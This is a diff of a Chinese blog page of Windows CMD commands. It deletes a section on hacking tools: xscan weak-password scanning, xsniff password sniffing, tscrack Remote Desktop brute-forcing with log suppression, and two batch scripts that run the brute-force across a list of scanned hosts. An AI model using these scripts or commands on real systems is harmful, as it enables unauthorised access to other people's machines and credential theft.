@@ -15,13 +15,11 @@
 <meta property="og:site_name" content="春涛的博客">
 <meta property="og:description" content="命令简介 cmd是command的缩写.即命令行 。 虽然随着计算机产业的发展，Windows 操作系统的应用越来越广泛，DOS 面临着被淘汰的命运，但是因为它运行安全、稳定，有的用户还在使用，所以一般Windows 的各种版本都与其兼容，用户可以在Windows 系统下运行DOS，中文版Windows XP 中的命令提示符进一步提高了与DOS 下操作命令的兼容性，用户可以在命令提示符直接输入中文">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://images.cnblogs.com/cnblogs_com/greatverve/1001.png">
-<meta property="article:published_time" content="2020-04-01T00:56:30.127Z">
-<meta property="article:modified_time" content="2020-04-01T00:56:41.993Z">
+<meta property="article:published_time" content="2020-04-01T01:14:15.917Z">
+<meta property="article:modified_time" content="2020-04-01T01:18:31.423Z">
 <meta property="article:author" content="春涛">
 <meta property="article:tag" content="随笔记录">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://images.cnblogs.com/cnblogs_com/greatverve/1001.png">
   
     <link rel="alternative" href="/atom.xml" title="春涛的博客" type="application/atom+xml">
   
@@ -174,7 +172,7 @@
 
         
         <a href="/2020/04/01/CMD%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" class="archive-article-date">
-  	<time datetime="2020-04-01T00:56:30.127Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-01</time>
+  	<time datetime="2020-04-01T01:14:15.917Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-01</time>
 </a>
         
       </header>
@@ -184,7 +182,7 @@
         <p><strong>命令简介</strong></p>
 <p>cmd是command的缩写.即命令行 。</p>
 <p>虽然随着计算机产业的发展，Windows 操作系统的应用越来越广泛，DOS 面临着被淘汰的命运，但是因为它运行安全、稳定，有的用户还在使用，所以一般Windows 的各种版本都与其兼容，用户可以在Windows 系统下运行DOS，中文版Windows XP 中的命令提示符进一步提高了与DOS 下操作命令的兼容性，用户可以在命令提示符直接输入中文调用文件。</p>
-<p>　　在9x系统下输入command就可以打开命令行.而在NT系统上可以输入cmd来打开，在windows2003后被cmd替代，利用CMD命令查询系统的信息或者是判断网络的好坏。下图为CMD启动后的界面。<br><img src="https://images.cnblogs.com/cnblogs_com/greatverve/1001.png" alt="img"></p>
+<p>　　在9x系统下输入command就可以打开命令行.而在NT系统上可以输入cmd来打开，在windows2003后被cmd替代，利用CMD命令查询系统的信息或者是判断网络的好坏。</p>
 <p>*<em>运行操作<br>*</em></p>
 <p>CMD命令：开始－&gt;运行－&gt;键入cmd或command(在命令行里可以看到系统版本、文件系统版本)</p>
 <p>CMD命令锦集</p>
@@ -561,180 +559,6 @@
 <p>　　| 管道命令</p>
 <p>　　&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令</p>
 <p>　　@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中</p>
-<p>　　&gt;与&gt;&gt;的区别 “&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。</p>
-<p>　　如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p>
-<p>　　八：</p>
-<p>　　扫描工具：xscan.exe</p>
-<p>　　基本格式</p>
-<p>　　xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息</p>
-<p>　　xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息</p>
-<p>　　检测项目</p>
-<p>　　-active 检测主机是否存活</p>
-<p>　　-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）</p>
-<p>　　-port 检测常用服务的端口状态</p>
-<p>　　-ftp 检测FTP弱口令</p>
-<p>　　-pub 检测FTP服务匿名用户写权限</p>
-<p>　　-pop3 检测POP3-Server弱口令</p>
-<p>　　-smtp 检测SMTP-Server漏洞</p>
-<p>　　-sql 检测SQL-Server弱口令</p>
-<p>　　-smb 检测NT-Server弱口令</p>
-<p>　　-iis 检测IIS编码/解码漏洞</p>
-<p>　　-cgi 检测CGI漏洞</p>
-<p>　　-nasl 加载Nessus攻击脚本</p>
-<p>　　-all 检测以上所有项目</p>
-<p>　　其它选项</p>
-<p>　　-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取</p>
-<p>　　-l 显示所有网络适配器</p>
-<p>　　-v 显示详细扫描进度</p>
-<p>　　-p 跳过没有响应的主机</p>
-<p>　　-o 跳过没有检测到开放端口的主机</p>
-<p>　　-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10</p>
-<p>　　-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)</p>
-<p>　　用法示例</p>
-<p>　　xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机</p>
-<p>　　xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机</p>
-<p>　　xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机</p>
-<p>　　九：</p>
-<p>　　命令行方式嗅探器: xsniff.exe</p>
-<p>　　可捕获局域网内FTP/SMTP/POP3/HTTP协议密码</p>
-<p>　　参数说明</p>
-<p>　　-tcp 输出TCP数据报</p>
-<p>　　-udp 输出UDP数据报</p>
-<p>　　-icmp 输出ICMP数据报</p>
-<p>　　-pass 过滤密码信息</p>
-<p>　　-hide 后台运行</p>
-<p>　　-host 解析主机名</p>
-<p>　　-addr IP地址 过滤IP地址</p>
-<p>　　-port 端口 过滤端口</p>
-<p>　　-log 文件名 将输出保存到文件</p>
-<p>　　-asc 以ASCII形式输出</p>
-<p>　　-hex 以16进制形式输出</p>
-<p>　　用法示例</p>
-<p>　　xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中</p>
-<p>　　xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出</p>
-<p>　　终端服务密码破解: tscrack.exe</p>
-<p>　　参数说明</p>
-<p>　　-h 显示使用帮助</p>
-<p>　　-v 显示版本信息</p>
-<p>　　-s 在屏幕上打出解密能力</p>
-<p>　　-b 密码错误时发出的声音</p>
-<p>　　-t 同是发出多个连接（多线程）</p>
-<p>　　-N Prevent System Log entries on targeted server</p>
-<p>　　-U 卸载移除tscrack组件</p>
-<p>　　-f 使用－f后面的密码</p>
-<p>　　-F 间隔时间（频率）</p>
-<p>　　-l 使用－l后面的用户名</p>
-<p>　　-w 使用－w后面的密码字典</p>
-<p>　　-p 使用－p后面的密码</p>
-<p>　　-D 登录主页面</p>
-<p>　　用法示例</p>
-<p>　　tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码</p>
-<p>　　tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户</p>
-<p>　　@if not exist ipcscan.txt goto noscan</p>
-<p>　　@for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%i</p>
-<p>　　nscan</p>
-<p>　　@echo 3389.txt no find or scan faild</p>
-<p>　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)</p>
-<p>　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat</p>
-<p>　　@if not exist tscrack.exe goto noscan</p>
-<p>　　@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt</p>
-<p>　　:noscan</p>
-<p>　　@echo tscrack.exe no find or scan faild</p>
-<p>　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)</p>
-<p>　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。</p>
-<p>　　其它</p>
-<p>　　Shutdown.exe</p>
-<p>　　Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）</p>
-<p>　　fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）</p>
-<p>　　fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息</p>
-<p>　　Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。</p>
-<p>　　OpenTelnet.exe (远程开启telnet工具)</p>
-<p>　　opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。</p>
-<p>　　NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。</p>
-<p>　　ResumeTelnet.exe (OpenTelnet附带的另一个工具)</p>
-<p>　　resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。</p>
-<p>　　FTP命令详解</p>
-<p>　　FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。</p>
-<p>　　FTP的命令行格式为：</p>
-<p>　　ftp -v -d -i -n -g [主机名] ，其中</p>
-<p>　　-v 显示远程服务器的所有响应信息</p>
-<p>　　-n 限制ftp的自动登录，即不使用；.n etrc文件；</p>
-<p>　　-d 使用调试方式；</p>
-<p>　　-g 取消全局文件名。</p>
-<p>　　FTP使用的内部命令如下(中括号表示可选项):</p>
-<p>　　1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip</p>
-<p>　　2.$ macro-ame[args]： 执行宏定义macro-name。</p>
-<p>　　3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。</p>
-<p>　　4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</p>
-<p>　　5.ascii：使用ascii类型传输方式。</p>
-<p>　　6.bell：每个命令执行完毕后计算机响铃一次。</p>
-<p>　　7.bin：使用二进制文件传输方式。</p>
-<p>　　8.bye：退出ftp会话过程。</p>
-<p>　　9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。</p>
-<p>　　10. cd remote-dir：进入远程主机目录。</p>
-<p>　　11.cdup：进入远程主机目录的父目录。</p>
-<p>　　12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</p>
-<p>　　13.close：中断与远程服务器的ftp会话(与open对应)。</p>
-<p>　　14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。</p>
-<p>　　15.delete remote-file：删除远程主机文件。</p>
-<p>　　16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</p>
-<p>　　17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</p>
-<p>　　18.disconnection：同close。</p>
-<p>　　19.form format：将文件传输方式设置为format，缺省为file方式。</p>
-<p>　　20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。</p>
-<p>　　21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</p>
-<p>　　22.hash：每传输1024字节，显示一个hash符号(#)。</p>
-<p>　　23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</p>
-<p>　　24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</p>
-<p>　　25.image：设置二进制传输方式(同binary)。</p>
-<p>　　26.lcd[dir]：将本地工作目录切换至dir。</p>
-<p>　　27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。</p>
-<p>　　28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</p>
-<p>　　29.mdelete[remote-file]：删除远程主机文件。</p>
-<p>　　30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir <em>.o.</em>.zipoutfile 。</p>
-<p>　　31.mget remote-files：传输多个远程文件。</p>
-<p>　　32.mkdir dir-name：在远程主机中建一目录。</p>
-<p>　　33.mls remote-file local-file：同nlist，但可指定多个文件名。</p>
-<p>　　34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</p>
-<p>　　35.modtime file-name：显示远程主机文件的最后修改时间。</p>
-<p>　　36.mput local-file：将多个文件传输至远程主机。</p>
-<p>　　37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</p>
-<p>　　38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</p>
-<p>　　39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。</p>
-<p>　　40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</p>
-<p>　　41.open host[port]：建立指定ftp服务器连接，可指定连接端口。</p>
-<p>　　42.passive：进入被动传输方式。</p>
-<p>　　43.prompt：设置多个文件传输时的交互提示。</p>
-<p>　　44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</p>
-<p>　　45.put local-file[remote-file]：将本地文件local-file传送至远程主机。</p>
-<p>　　46.pwd：显示远程主机的当前工作目录。</p>
-<p>　　47.quit：同bye，退出ftp会话。</p>
-<p>　　48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.</p>
-<p>　　49.recv remote-file[local-file]：同get。</p>
-<p>　　50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</p>
-<p>　　51.rhelp[cmd-name]：请求获得远程主机的帮助。</p>
-<p>　　52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</p>
-<p>　　53.rename[from][to]：更改远程主机文件名。</p>
-<p>　　54.reset：清除回答队列。</p>
-<p>　　55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。</p>
-<p>　　56.rmdir dir-name：删除远程主机目录。</p>
-<p>　　57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</p>
-<p>　　58.send local-file[remote-file]：同put。</p>
-<p>　　59.sendport：设置PORT命令的使用。</p>
-<p>　　60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。</p>
-<p>　　61.size file-name：显示远程主机文件大小，如：site idle 7200。</p>
-<p>　　62.status：显示当前ftp状态。</p>
-<p>　　63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。</p>
-<p>　　64.sunique：将远程主机文件名存储设置为只一(与runique对应)。</p>
-<p>　　65.system：显示远程主机的操作系统类型。</p>
-<p>　　66.tenex：将文件传输类型设置为TENEX机的所需的类型。</p>
-<p>　　67.tick：设置传输时的字节计数器。</p>
-<p>　　68.trace：设置包跟踪。</p>
-<p>　　69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。</p>
-<p>　　70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</p>
-<p>　　71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</p>
-<p>　　72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</p>
-<p>　　73.?[cmd]：同help.</p>
 
       
 
